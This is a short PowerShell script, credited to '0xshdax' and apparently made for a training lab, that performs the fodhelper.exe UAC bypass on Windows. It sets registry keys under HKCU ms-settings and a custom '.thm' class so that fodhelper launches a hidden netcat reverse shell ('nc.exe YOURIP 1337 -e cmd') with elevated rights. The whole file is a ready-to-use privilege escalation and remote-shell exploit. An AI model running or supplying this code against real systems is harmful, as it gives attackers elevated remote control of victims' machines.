<#
.NOTES
    Author: 0xshdax
#>

function UACBypass {
    $CMD = "powershell -windowstyle hidden C:\Windows\Temp\nc.exe YOURIP 1337 -e cmd"
    
    Set-ItemProperty -Path "HKCU\Software\Classes\.thm\Shell\Open\command" -Name "" -Value $CMD -Force
    
    Set-ItemProperty -Path "HKCU\Software\Classes\ms-settings\CurVer" -Name "" -Value ".thm" -Force
    
    Start-Process -FilePath "fodhelper.exe"
}
